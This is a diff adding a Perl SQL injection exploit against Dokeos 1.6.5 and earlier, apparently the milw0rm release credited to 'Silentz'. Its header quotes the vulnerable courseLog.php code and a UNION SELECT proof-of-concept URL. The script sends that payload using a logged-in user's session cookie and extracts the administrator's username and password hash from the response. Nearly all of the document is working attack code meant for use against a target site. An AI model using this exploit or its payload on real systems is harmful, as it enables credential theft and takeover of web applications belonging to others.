@@ -1,0 +1,87 @@
+#!/usr/bin/perl -w
+
+#################################################################################
+#										#
+#	      	      Dokeos <= 1.6.5 SQL Injection Exploit			#
+#										#
+# Discovered by: Silentz							#
+# Payload: Admin Username & Hash Retrieval					#
+# Website: http://www.w4ck1ng.com						#
+# 										#
+# Vulnerable Code (courseLog.php): 						#
+#										#
+#	if ($_GET['scormcontopen'])						#
+#	{									#
+#	include_once(api_get_library_path().'/database.lib.php');		#
+#	include('../scorm/XMLencode.php');					#
+#	$TBL_SCORM_MAIN     = Database::get_scorm_main_table();			#
+#	$result = api_sql_query("SELECT contentTitle FROM $TBL_SCORM_MAIN 	#
+#	where (contentId=".$_GET['scormcontopen'].")");				#
+#	$ar = mysql_fetch_array($result);					#
+#	$contentTitle = $ar['contentTitle'];					#
+#	$path=api_get_path('SYS_COURSE_PATH');					#
+#	$file=$path.$_cid.'/scorm'.$contentTitle.'/imsmanifest.xml';		#
+#	$charset = GetXMLEncode($file);						#
+#	header('Content-Type: text/html; charset='. $charset);			#
+#	}									#
+#										#
+# PoC: /claroline/tracking/courseLog.php?scormcontopen=-999) UNION SELECT 	#
+#      CONCAT(char(58),char(58),username,char(58),char(58),password,char(58),	#
+#      char(58)) FROM user WHERE user_id=1 /*					#
+#										#
+# 										#
+# Subject To: Having an already existant student/teacher account		#
+#										#
+# GoogleDork: Get your own!							#
+# Shoutz: The entire w4ck1ng community						#
+#										#
+# Notes: You need to obtain your current SESSION_ID; use your browser to 	#
+#	 disclose or find an XSS.						#
+#										#
+#################################################################################
+
+use LWP::UserAgent;
+if (@ARGV < 2){
+print "-------------------------------------------------------------------------\r\n";
+print "           	   Dokeos <= 1.6.5 SQL Injection Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "Usage: w4ck1ng_dokeos.pl [PATH] [SESSION_ID]\r\n\r\n";
+print "[PATH] = Path where Dokeos is located\r\n";
+print "[SESSION_ID] = Session identifier of logged on user\r\n\r\n";
+print "e.g. w4ck1ng_dokeos.pl http://victim.com/dokeos/ cjjjauie95inbmo5fim8m93vo1\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "            		 http://www.w4ck1ng.com\r\n";
+print "            		        ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+exit();
+}
+
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$cookie = "$ARGV[1];";
+$host = $ARGV[0] . "claroline/tracking/courseLog.php?scormcontopen=-999) UNION SELECT CONCAT(char(58),char(58),username,char(58),char(58),password,char(58),char(58)) FROM user WHERE user_id=1 /*";
+
+my @cookie = ('Cookie' => "dk_sid=$cookie;");
+my $res = $b->get($host, @cookie);
+
+$answer = $res->content;
+if ($answer =~ /scorm::(.*?)::/){
+print "-------------------------------------------------------------------------\r\n";
+print "           	   Dokeos <= 1.6.5 SQL Injection Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "[+] Admin User : $1\n";
+}
+
+if ($answer =~/::([0-9a-fA-F]{32})::\/imsmanifest.xml/){
+print "[+] Admin Hash : $1\n";
+print "-------------------------------------------------------------------------\r\n";
+print "            		 http://www.w4ck1ng.com\r\n";
+print "            		        ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+}
+
+else {
+  print "\nExploit Failed...\n";
+}
+
+# milw0rm.com [2007-05-24]
